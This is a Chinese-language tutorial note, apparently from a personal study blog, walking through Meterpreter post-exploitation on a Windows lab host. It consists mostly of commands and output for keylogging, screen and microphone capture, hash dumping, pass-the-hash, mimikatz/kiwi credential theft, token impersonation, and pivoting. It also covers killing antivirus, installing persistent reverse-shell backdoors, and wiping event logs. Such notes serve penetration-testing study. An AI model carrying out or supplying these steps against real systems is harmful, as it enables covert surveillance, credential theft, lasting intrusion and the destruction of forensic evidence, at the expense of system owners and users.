# Meterpreter

个人见解：Meterpreter就是cmdshell pro

在Windows上建立Meterpreter需要有PowerShell

## 捕获控制设备信息

### 捕获屏幕

可以使用以下命令捕获屏幕

```
screenshot
```

返回结果

```
eterpreter > screenshot
Screenshot saved to: /home/adian/ooTGibPg.jpeg
```

### 捕获麦克风

命令

```
run sound_recorder
```

默认录制30秒声音，如果需要更长时间，需要使用`-l`参数

```
meterpreter > run sound_recorder
[*] Saving recorded audio to /root/.msf4/logs/scripts/sound_recorder/WIN-ITNJLFM93P3_20210520.1422
[*] Recording a total of 0m 30s
```

## 获取键盘记录

命令

```
run post/windows/capture/keylog_recorder
```

结果

```
[*] Executing module against WIN-ITNJLFM93P3_1.wav
[*] Starting the keylog recorder...
[*] Keystrokes being saved in to /root/.msf4/loot/20210520231706_TestWin7_10.10.10.132_host.windows.key_377741.txt
[*] Recording keystrokes...
[*] User interrupt.
[*] Shutting down keylog recorder. Please wait...
```

或者使用

```
keyscan_start
```

在捕获后可以使用

```
keyscan_dump
```

来获取内容

如果需要停止，使用以下命令

```
keyscan_stop
```

## 提升权限

使用以下命令获取权限等级

```
getuid
```

得到目前我们是system权限

```
Server username: NT AUTHORITY\SYSTEM
```

如果我们不是system权限，我们可以直接使用以下命令来提升权限

```
getsystem
```

## 挖掘用户名和密码

Windows系统存储哈希值的方式一般为LAN Manager(LM),NT LAN Manager(NTLM),或者NT LAN Manager V2(NTLMv2)

在msf中，我们可以使用hashdump命令获取系统所有用户名和密码的哈希值

```
hashdump
```

此命令需要system权限

## 传递哈希值登录

我们使用`windows/smb/psexec`模块来传递哈希值

我们将获取到的哈希值set给SMBUser和SMBPass,比如我们获取到hash

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

给SMBUser

```
Administrator
```

给SMBPass

```
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

## 破解纯文本密码

在Meterpreter下，使用`Mimikatz`获取密码

首先加载Mimikatz模块

```
load mimikatz
```

得到如下结果

```
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

在msf6中，mimikatz被kiwi替代了

```
The "mimikatz" extension has been replaced by "kiwi". Please use this in future.
```

帮助文档如下

```
Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unpars
                           ed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCS
                           ync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```

kiwi拥有更全面的功能，基本保留了mimikatz的功能

```
meterpreter > creds_msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

Username  Domain           LM                NTLM              SHA1
--------  ------           --                ----              ----
test      WIN-ITNJLFM93P3  aad3b435b51404ee  31d6cfe0d16ae931  da39a3ee5e6b4b0d
                           aad3b435b51404ee  b73c59d7e0c089c0  3255bfef95601890
                                                               afd80709

```



## 假冒令牌

### steal_token

使用假冒令牌可以假冒某个网络中的另一个用户进行操作，如提升用户权限，创建用户和组等，当用户登录Windows时，会给他一个访问令牌作为认证会话的一部分。例如一个入侵用户可能需要以域管理员的身份执行操作，就需要使用假冒令牌的方式

使用ps指令查看当前运行的应用程序以及所对应的用户

```
ps
```

盗取令牌语法如下

```
steal_token PID
```

此时就是以盗取的用户身份执行

### incognito

首先加载此模块

```
load incognito
```

执行命令

```
list_tokens -u
```

可以查看到所有可用令牌

使用如下命令进行假冒

```
impersonate_token domain\\name
```

注意是两个反斜杠

## 获取目标主机删除的文件

使用模块

```
post/windows/gather/forensics/recovery_files
```

设定DRIVE盘符和session id，即可进行恢复

## 将MeterpreterShell作为跳板渗透

使用以下命令获取当前子网

```
run get_local_subnets
```

得到如下结果

```
meterpreter > run get_local_subnets 

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
Local subnet: 10.10.10.0/255.255.255.0
```

这里提示可以用post模块中的autoroute来自动配置路由

```
meterpreter > run post/multi/manage/autoroute 

[!] SESSION may not be compatible with this module.
[*] Running module against WIN-ITNJLFM93P3
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.10.10.0/255.255.255.0 from host's routing table.
vc6.Route added to subnet 169.254.0.0/255.255.0.0 from Bluetooth
```

我们也可以手动添加路由，首先需要先将shell放到后台

```
background
```

然后手动添加路由

```
route add 子网 掩码 会话ID
```

## Meterpreter脚本

使用方法

```
run 脚本路径/名称
```

### 迁移进程

脚本

```
post/windows/manage/migrate
```

或者可以直接使用migrate迁移权限到指定PID

```
migrate PID
```

### 关闭杀毒软件

```
run killav
```

在msf6中虽然还可以使用，但是会提示已弃用

```
meterpreter > run killav

[!] Meterpreter scripts are deprecated. Try post/windows/manage/killav.
[!] Example: run post/windows/manage/killav OPTION=value [...]
[*] Killing Antivirus services on the target...
[*] Killing off cmd.exe...
```

经过测试，无法识别出火绒杀毒，但是MS17-010攻击被火绒拦截

### 查看目标机器上所有流量

使用packetrecorder进行流量劫持，然后可以通过Wireshark进行分析

```
meterpreter > run packetrecorder -i 1

[!] Meterpreter scripts are deprecated. Try post/windows/manage/rpcapd_start.
[!] Example: run post/windows/manage/rpcapd_start OPTION=value [...]
[*] Starting Packet capture on interface 1
[+] Packet capture started
[*] Packets being saved in to /root/.msf4/logs/scripts/packetrecorder/WIN-ITNJLFM93P3_20210521.5655/WIN-ITNJLFM93P3_20210521.5655.cap
[*] Packet capture interval is 30 Seconds
```

### 获取系统信息

通过scraper脚本可以列举处用户想要的所有信息

```
meterpreter > run scraper 
[*] New session on 10.10.10.132:445...
[*] Gathering basic system information...
[*] Dumping password hashes...
[*] Obtaining the entire registry...
[*]  Exporting HKCU
[*]  Downloading HKCU (C:\Windows\TEMP\AoxTqVci.reg)
[*]  Cleaning HKCU
[*]  Exporting HKLM
[*]  Downloading HKLM (C:\Windows\TEMP\xaFqszRg.reg)
[*]  Cleaning HKLM
[*]  Exporting HKCC
[*]  Downloading HKCC (C:\Windows\TEMP\OqrObWNV.reg)
[*]  Cleaning HKCC
[*]  Exporting HKCR
[*]  Downloading HKCR (C:\Windows\TEMP\rAJZLqAf.reg)
[*]  Cleaning HKCR
[*]  Exporting HKU
[*]  Downloading HKU (C:\Windows\TEMP\esDrHZoB.reg)
[*]  Cleaning HKU
[*] Completed processing on 10.10.10.132:445...
```

## 创建持久后门

使用persistence脚本和metsv创建持久后门

```
meterpreter > run persistence 

[!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
[!] Example: run exploit/windows/local/persistence OPTION=value [...]
[*] Running Persistence Script
[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WIN-ITNJLFM93P3_20210521.0320/WIN-ITNJLFM93P3_20210521.0320.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=10.10.10.128 LPORT=4444
[*] Persistent agent script is 99668 bytes long
[+] Persistent Script written to C:\Windows\TEMP\ArDebnpVV.vbs
[*] Executing script C:\Windows\TEMP\ArDebnpVV.vbs
[+] Agent executed with PID 2524
```

可以通过

```
run peresistence -h
```

来查看帮助信息，创建自定义后门

```
meterpreter > run metsvc 

[!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
[!] Example: run exploit/windows/local/persistence OPTION=value [...]
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Windows\TEMP\nzDwNmYr...
[*]  >> Uploading metsrv.x86.dll...
[*]  >> Uploading metsvc-server.exe...
[*]  >> Uploading metsvc.exe...
[*] Starting the service...
         * Installing service metsvc
 * Starting service
Service metsvc successfully installed.
```

使用`multi/handler`监听即可建立会话,此时注意handler的payload,否则session会close

## 将命令行shell升级为Meterpreter

可以直接

```
sessions -u ID
```

## 清除痕迹

直接使用irb即可

```
meterpreter > irb
[*] Starting IRB shell...
>>
```

在进入`>>`交互的时候选中要删除的日志

```
log = client.sys.eventlog.open(‘system’)
log = client.sys.eventlog.open(‘security’)
log = client.sys.eventlog.open(‘application’)
log = client.sys.eventlog.open(‘directory service’)
log = client.sys.eventlog.open(‘dns server’)
log = client.sys.eventlog.open(‘file replication service’)
```

最后删除

```
log.clear
```



或者使用`clearev`

```
meterpreter > clearev 
[*] Wiping 299 records from Application...
[*] Wiping 939 records from System...
[*] Wiping 230 records from Security...
```









